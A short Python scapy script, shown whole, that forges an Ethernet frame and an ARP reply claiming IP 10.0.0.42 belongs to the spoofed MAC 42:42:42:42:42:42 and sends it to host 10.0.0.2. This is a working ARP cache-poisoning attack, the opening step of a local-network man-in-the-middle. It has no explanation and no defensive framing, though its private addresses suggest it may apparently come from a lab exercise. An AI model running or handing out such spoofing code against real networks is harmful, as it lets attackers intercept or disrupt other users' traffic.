from scapy.all import Ether , sendp, IP, ARP

eth = Ether(src="42:42:42:42:42:42", type="ARP")

arp = ARP(op=2,hwsrc="42:42:42:42:42:42", psrc="10.0.0.42", pdst="10.0.0.2")

pckt = eth / arp
sendp(pckt)